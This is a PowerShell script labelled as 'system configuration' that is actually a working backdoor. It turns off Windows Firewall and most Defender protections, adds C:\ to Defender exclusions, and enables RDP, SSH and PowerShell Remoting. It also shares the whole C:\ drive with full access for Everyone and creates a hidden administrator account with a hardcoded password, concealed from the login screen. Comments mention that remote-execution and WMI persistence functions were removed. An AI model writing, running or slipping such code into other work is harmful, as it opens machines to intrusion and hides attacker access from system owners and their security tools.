# PowerShell script for system configuration

# Global variables
$shareName = "MainDrive"
$drivePath = "C:\"
$username = "`$ystemSvc"  # Username with $ for better hiding
$password = ConvertTo-SecureString "S@shank123" -AsPlainText -Force
$persistentPath = "C:\Windows\System32\Tasks\constant.ps1"

"[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] hey there" | Out-File "$env:Public\hey.txt" -Append

# Ensure script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "This script must be run as Administrator"
    exit
}

function Setup-Environment {
    # 1. Enable RDP, SSH, PSRemoting
    Write-Output "Enabling remote access services..."
    
    # Disable Windows Firewall completely
    Write-Output "Disabling Windows Firewall..."
    $firewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    if ($firewallProfiles) {
        $firewallStatus = ($firewallProfiles | Where-Object { $_.Enabled -eq $true } | Measure-Object).Count
        
        if ($firewallStatus -gt 0) {
            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
            Write-Output "Windows Firewall has been completely disabled."
        } else {
            Write-Output "Windows Firewall is already disabled."
        }
    } else {
        # Alternative method if Get-NetFirewallProfile fails
        netsh advfirewall set allprofiles state off
        Write-Output "Windows Firewall disabled using netsh command."
    }
    
    # Enable RDP if not already enabled
    $rdpStatus = Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
    if ($rdpStatus -and $rdpStatus.fDenyTSConnections -ne 0) {
        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
        # No need to enable firewall rules since firewall is disabled
        Write-Output "RDP enabled."
    } else {
        Write-Output "RDP already enabled."
    }
    
    # Enable SSH if not already running
    $sshService = Get-Service -Name sshd -ErrorAction SilentlyContinue
    if (-not $sshService) {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'
        Write-Output "SSH installed and enabled."
    } elseif ($sshService.Status -ne 'Running') {
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'
        Write-Output "SSH service started."
    } else {
        Write-Output "SSH already running."
    }
    
    # Enable PSRemoting if not already enabled
    $psRemotingEnabled = Get-ChildItem WSMan:\localhost\Service\EnableCompatibilityHttpListener -ErrorAction SilentlyContinue
    if (-not $psRemotingEnabled) {
        Enable-PSRemoting -Force -SkipNetworkProfileCheck
        Write-Output "PowerShell Remoting enabled."
    } else {
        Write-Output "PowerShell Remoting already enabled."
    }
    
    # 2. Share C:\ drive with no authentication
    Write-Output "Checking and configuring C:\ share..."
    
    $existingShare = Get-WmiObject -Class Win32_Share -Filter "Name='$shareName'"
    if (-not $existingShare) {
        # Create share with Everyone full access
        $share = [WMIClass]"Win32_Share"
        $share.Create($drivePath, $shareName, 0, $null, "C Drive Share")
        
        # Grant Everyone full access to the share
        $acl = Get-Acl $drivePath
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
        $acl.SetAccessRule($accessRule)
        Set-Acl $drivePath $acl
        
        # No need for specific firewall rules since firewall is disabled
        Write-Output "C:\ drive shared successfully."
    } else {
        Write-Output "Share '$shareName' already exists."
    }
    
    # 3. Create hidden user with special characters
    Write-Output "Checking for hidden user..."
    
    if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
        # Create user with special character in name
        New-LocalUser -Name $username -Password $password -PasswordNeverExpires $true -AccountNeverExpires -Description "System Account"
        Add-LocalGroupMember -Group "Administrators" -Member $username
        
        # Hide user from login screen
        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
        if (!(Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force | Out-Null
        }
        New-ItemProperty -Path $registryPath -Name $username -Value 0 -PropertyType DWORD -Force
        
        # Additional hiding: Set user account as system account type
        $userADSI = [ADSI]"WinNT://$env:COMPUTERNAME/$username"
        $userADSI.UserFlags.Value = $userADSI.UserFlags.Value -bor 0x40 # Set DONT_EXPIRE_PASSWORD
        $userADSI.SetInfo()
        
        Write-Output "Hidden user with special character created successfully."
    } else {
        Write-Output "User '$username' already exists."
    }
    
    # 5. Disable Defender and add exclusions
    Write-Output "Configuring Windows Defender..."
    
    # Check if Defender is already disabled
    $defenderPrefs = Get-MpPreference
    
    if ($defenderPrefs.DisableRealtimeMonitoring -ne $true) {
        # Disable Real-time protection
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Output "Defender real-time monitoring disabled."
    }
    
    # Check for exclusions
    $exclusions = $defenderPrefs.ExclusionPath
    if ($exclusions -notcontains "C:\") {
        # Add C:\ to exclusion list
        Add-MpPreference -ExclusionPath "C:\"
        Write-Output "Added C:\ to Defender exclusions."
    }
    
    # Disable other security features if not already disabled
    if ($defenderPrefs.DisableBehaviorMonitoring -ne $true) {
        Set-MpPreference -DisableBehaviorMonitoring $true
    }
    
    if ($defenderPrefs.DisableIOAVProtection -ne $true) {
        Set-MpPreference -DisableIOAVProtection $true
    }
    
    if ($defenderPrefs.DisableIntrusionPreventionSystem -ne $true) {
        Set-MpPreference -DisableIntrusionPreventionSystem $true
    }
    
    if ($defenderPrefs.DisableScriptScanning -ne $true) {
        Set-MpPreference -DisableScriptScanning $true
    }
    
    Write-Output "Defender configuration complete."
}

# Removed Execute-RemoteScript function
# Removed Create-WMIPersistence function

# Main execution - now directly runs the environment setup
try {
    # Set up the environment directly
    Setup-Environment
    
    Write-Output "System configuration completed successfully."
}
catch {
    Write-Error "An error occurred during system configuration: $_"
}
